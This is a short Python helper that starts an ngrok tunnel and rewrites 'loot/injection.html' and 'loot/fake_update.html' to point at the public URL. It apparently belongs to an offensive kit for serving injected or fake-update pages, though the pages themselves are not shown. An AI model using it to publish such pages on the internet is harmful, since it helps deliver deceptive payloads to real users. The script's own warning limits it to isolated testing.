#!/usr/bin/env python3
import os
import time
import json
import requests
from subprocess import Popen

def start_ngrok(port=80):
    print("🚀 Launching Ngrok tunnel on port 80...")
    ngrok_cmd = f"./ngrok http {port}"
    Popen(ngrok_cmd.split(), stdout=open(os.devnull, 'w'))
    time.sleep(3)  # Give ngrok time to launch

    try:
        response = requests.get("http://localhost:4040/api/tunnels")
        tunnels = response.json()["tunnels"]
        public_url = tunnels[0]["public_url"]
        print(f"🌍 Ngrok Public URL: {public_url}")
        return public_url
    except Exception as e:
        print(f"❌ Failed to get Ngrok URL: {e}")
        return None

def replace_local_with_ngrok(public_url):
    print("📝 Rewriting HTML files for Ngrok delivery...")
    loot_files = ["loot/injection.html", "loot/fake_update.html"]
    for file in loot_files:
        if os.path.exists(file):
            with open(file, "r") as f:
                content = f.read()
            content = content.replace("http://10.0.0.1", public_url)
            with open(file, "w") as f:
                f.write(content)
            print(f"✅ Updated {file}")
        else:
            print(f"⚠️ {file} not found.")

def main():
    if not os.path.exists("ngrok"):
        print("❌ Ngrok binary not found! Download it from: https://ngrok.com/download")
        return

    public_url = start_ngrok()
    if public_url:
        replace_local_with_ngrok(public_url)
        print("\n⚠️ WARNING: This Ngrok URL is public and may be indexed.")
        print("🧪 Use in isolated test environments only!\n")

if __name__ == "__main__":
    main()
